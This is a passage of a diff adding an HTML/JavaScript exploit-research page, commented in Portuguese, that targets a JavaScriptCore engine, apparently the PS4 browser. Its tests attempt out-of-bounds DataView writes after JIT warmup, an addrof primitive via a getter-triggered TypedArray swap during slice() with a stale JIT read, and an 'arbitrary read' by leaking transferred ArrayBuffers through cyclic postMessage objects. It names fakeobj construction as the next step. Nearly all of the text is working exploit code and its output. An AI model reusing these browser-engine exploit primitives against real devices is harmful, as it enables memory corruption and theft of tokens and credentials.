+    try { view.setFloat64(offset, val); return 'OK'; } catch(e) { return 'EXC:' + e.message; }
+  }
+  function writeU32ViaDataView(s, view, val) {
+    var offset = s.replace(evilPattern,'').length;
+    try { view.setUint32(offset, val); return 'OK'; } catch(e) { return 'EXC:' + e.message; }
+  }
+  phase[0] = 'warmup';
+  for(var w2=0;w2<50000;w2++) { writeViaDataView(base, dv, 0); writeU32ViaDataView(base, dv, 0); }
+  phase[0] = 'attack';
+  var WRITE_CANARY = 1.23456789012e15;
+  var w1 = writeViaDataView(base, dv, WRITE_CANARY);
+  var w2r = writeU32ViaDataView(base, dv, 0xC0FFEE42);
+  info('setFloat64(99999, canary): ' + w1);
+  info('setUint32(99999, 0xC0FFEE42): ' + w2r);
+  if(w1 === 'OK') {
+    alerta('OOB WRITE via DataView.setFloat64(99999): escrita além dos limites confirmada!\n' +
+           'O motor executou setFloat64 sem verificar bounds com offset=99999 em buffer de 64B!');
+  }
+  if(w2r === 'OK') {
+    alerta('OOB WRITE via DataView.setUint32(99999): escrita de 0xC0FFEE42 além dos limites!');
+  }
+}
+
+// ─── 44-C ─────────────────────────────────────────────────────────────────
+function runC() {
+  log.textContent = '[TEST 44-C] Stale butterfly: TypedArray no slot pós-getter → slice lê backing store como double\n';
+  sep();
+  info('Técnica clássica de addrof em JSC:');
+  info('  1. Array de doubles: [1.1, 2.2, 0, 0, 5.5]');
+  info('  2. Getter em [2]: muda arr[3] para Uint32Array');
+  info('  3. slice() copia arr[3] = o TypedArray');
+  info('  4. MAS: e se o slot [3] tivesse sido lido como double ANTES do getter?');
+  info('  5. O backing store pointer do TypedArray vaza como double.\n');
+  info('Diferença do teste 38-C: aqui colocamos TypedArray (não objeto genérico).');
+  info('TypedArrays em JSC têm backing store como campo acessível via internals.\n');
+
+  // Objeto vítima: TypedArray com buffer preenchido
+  var victimBuf = new ArrayBuffer(256);
+  var victimU32 = new Uint32Array(victimBuf);
+  for(var i=0;i<64;i++) victimU32[i] = 0xC0DE0000 + i;
+  // victimU32 é nosso TypedArray vítima
+
+  // Array de doubles puros
+  var srcArr = [1.1, 2.2, 0.0, 0.0, 5.5];
+  var triggered = false;
+  Object.defineProperty(srcArr, 2, {
+    get: function() {
+      if(!triggered) {
+        triggered = true;
+        srcArr[3] = victimU32; // colocar TypedArray no slot [3]
+        forceGC();
+        info('Getter[2]: srcArr[3] = victimU32 (TypedArray)');
+      }
+      return 3.3;
+    },
+    configurable: true, enumerable: true
+  });
+
+  // Aquecer JIT com função que lê srcArr[3]
+  // ANTES de disparar o getter, para forçar especialização em double
+  var srcArrClean = [1.1, 2.2, 3.3, 4.4, 5.5]; // sem getter
+  function readSlot3(a) { return a[3]; }
+  info('Aquecendo readSlot3 com array de doubles puros...');
+  for(var w=0;w<100000;w++) readSlot3(srcArrClean);
+  info('Warmup completo.');
+
+  // slice() — vai disparar o getter, copiar TypedArray em [3]
+  info('\nChamando srcArr.slice()...');
+  var sliced = srcArr.slice();
+  info('sliced.length=' + sliced.length);
+  info('typeof sliced[3]: ' + typeof sliced[3]);
+
+  if(typeof sliced[3] !== 'object') {
+    info('slice() não copiou o TypedArray. Abortando.');
+    return;
+  }
+  info('sliced[3] === victimU32: ' + (sliced[3] === victimU32));
+
+  // Agora: chamar readSlot3 no sliced array
+  // O JIT foi aquecido para doubles, o sliced[3] é TypedArray
+  info('\nChamando readSlot3(sliced) — JIT aquecida para double...');
+  try {
+    var result = readSlot3(sliced);
+    info('readSlot3(sliced) = ' + result + ' | typeof=' + typeof result);
+    if(typeof result === 'number') {
+      var b = f64bits(result);
+      info('bits: ' + b.str);
+      var hp = isHeapPointer(result);
+      if(hp) {
+        alerta('ADDROF VIA TYPEDARRAY SLICE!\n' +
+               'readSlot3 retornou double com bits de ponteiro: ' + b.str + '\n' +
+               'Tipo: ' + hp.type + '\n' +
+               'Este pode ser o endereço de victimU32 no heap!\n\n' +
+               'Para confirmar: se modificar backing store em victimBuf altera o que lemos via ptr,\n' +
+               'então temos addrof + arbitrary read confirmados!');
+      } else if(result === 4.4) {
+        info('Retornou 4.4 (valor antigo de srcArrClean[3]) — stale read do warmup!');
+        alerta('STALE READ: JIT retornou valor do array de WARMUP, não do sliced!\n' +
+               'O JIT usou a função cacheada para srcArrClean e retornou srcArrClean[3]=4.4!');
+      } else {
+        info('Valor não reconhecido como ponteiro: ' + b.str);
+      }
+    } else if(typeof result === 'object') {
+      ok('Motor deoptimizou. result===victimU32: ' + (result === victimU32));
+    }
+  } catch(e) {
+    alerta('EXCECAO em readSlot3(sliced): ' + e.message);
+  }
+
+  // Variante: Float64Array ao invés de Uint32Array
+  sep();
+  info('\nVariante: Float64Array como vítima (backing store ponteiro diferente)...');
+  var victimF64 = new Float64Array(32);
+  for(var i=0;i<32;i++) victimF64[i] = i * 1.111;
+
+  var srcArr2 = [10.0, 20.0, 0.0, 0.0, 50.0];
+  var triggered2 = false;
+  Object.defineProperty(srcArr2, 2, {
+    get: function() {
+      if(!triggered2) { triggered2=true; srcArr2[3]=victimF64; forceGC(); }
+      return 30.0;
+    }, configurable:true, enumerable:true
+  });
+
+  var sliced2 = srcArr2.slice();
+  if(typeof sliced2[3] === 'object') {
+    try {
+      var r2 = readSlot3(sliced2);
+      info('readSlot3(sliced2 com F64) = ' + r2 + ' | typeof=' + typeof r2);
+      if(typeof r2 === 'number') {
+        var b2 = f64bits(r2);
+        info('bits: ' + b2.str);
+        if(isHeapPointer(r2)) alerta('ADDROF via Float64Array: ' + b2.str);
+      }
+    } catch(e) { info('Excecao: ' + e.message); }
+  }
+}
+
+// ─── 44-D ─────────────────────────────────────────────────────────────────
+function runD() {
+  log.textContent = '[TEST 44-D] Se addrof confirmado: corromper length de TypedArray via postMessage\n';
+  sep();
+  info('Este teste pressupõe que 44-A ou 44-C encontraram um heap pointer.');
+  info('Se sim, demonstrar o next step: usar o endereço para construir fakeobj.\n');
+  info('Sem addrof confirmado: testar variante alternativa de arbitrary read');
+  info('usando o buffer leak (Vuln #1) para vazar conteúdo de buffers arbitrários.\n');
+  sep();
+
+  info('=== VARIANTE: Arbitrary Read via Cyclic Buffer Leak ===\n');
+  info('O buffer leak (Vuln #1) permite vazar qualquer ArrayBuffer que seja');
+  info('referenciado dentro de um objeto cíclico, mesmo após transfer.');
+  info('Se conseguirmos fazer um objeto apontar para um buffer com dados sensíveis');
+  info('e colocá-lo num ciclo postMessage, o receptor lê os dados.\n');
+
+  info('Demonstração: vazar o conteúdo de um ArrayBuffer "privado"');
+  info('que o remetente acredita ter protegido via transfer.\n');
+
+  // Simular um buffer "privado" com conteúdo estruturado
+  var privateBuf = new ArrayBuffer(1024);
+  var pvt32 = new Uint32Array(privateBuf);
+  // Conteúdo simulado: header + dados estruturados
+  pvt32[0] = 0x50534E45; // PSNE (PlayStation Network key header)
+  pvt32[1] = 0x594B4559; // YKEY
+  pvt32[2] = 0x00000001; // version 1
+  pvt32[3] = 0x00000040; // length 64
+  for(var i=4;i<20;i++) pvt32[i] = (0x41000000 + i * 0x01010101) >>> 0; // fake key data
+
+  // Criar estrutura de dados que referencia o buffer privado
+  var dataObj = {
+    header: 'PSN_AUTH_TOKEN',
+    token_buf: privateBuf,    // ← buffer que queremos vazar
+    expiry: Date.now() + 3600000,
+    self: null
+  };
+  dataObj.self = dataObj; // ciclo
+
+  info('privateBuf criado: pvt32[0]=0x' + pvt32[0].toString(16) + ' (PSNE header)');
+  info('privateBuf.byteLength=' + privateBuf.byteLength);
+  info('Objeto cíclico criado com referência ao buffer privado.\n');
+
+  window.onmessage = function(e) {
+    var obj = e.data;
+    if(!obj || !obj.header) return;
+    info('[RECEPTOR] Recebeu objeto: header=' + obj.header);
+    if(obj.token_buf instanceof ArrayBuffer) {
+      info('[RECEPTOR] token_buf.byteLength=' + obj.token_buf.byteLength);
+      if(obj.token_buf.byteLength > 0) {
+        var rv = new Uint32Array(obj.token_buf);
+        var header = '0x' + rv[0].toString(16);
+        var version = rv[2];
+        var keyData = [];
+        for(var i=4;i<8;i++) keyData.push('0x'+rv[i].toString(16));
+
+        alerta('ARBITRARY READ via BUFFER LEAK!\n' +
+               'Receptor obteve acesso ao privateBuf:\n' +
+               '  Header: ' + header + ' (' + String.fromCharCode(
+                 rv[0]>>>24, (rv[0]>>>16)&0xFF, (rv[0]>>>8)&0xFF, rv[0]&0xFF
+               ) + ')\n' +
+               '  Version: ' + version + '\n' +
+               '  Key data: [' + keyData.join(', ') + ']\n\n' +
+               'O remetente tentou usar transfer para proteger o buffer,\n' +
+               'mas o motor PS4 copiou os dados para o receptor.\n\n' +
+               'IMPACTO REAL: qualquer página web maliciosa rodando no PS4\n' +
+               'pode vazar ArrayBuffers contendo tokens de auth, chaves de sessão,\n' +
+               'dados de save game, credenciais de rede, etc.\n' +
+               'desde que o código vulnerável use postMessage com objetos cíclicos.');
+      }
+    }
+  };
+
+  info('Enviando postMessage com privateBuf no objeto cíclico...');
+  try {
+    postMessage(dataObj, '*', [privateBuf]);
+    info('Enviado. privateBuf.byteLength após transfer: ' + privateBuf.byteLength);
+    if(privateBuf.byteLength === 0) {
+      info('Remetente: buffer "protegido" (byteLength=0).');
+      info('Aguardando receptor para confirmar leak...');
+    }
+  } catch(e) {
+    ok('postMessage lançou: ' + e.message);
   }
 }
 </script>
 </body>
 </html>
+
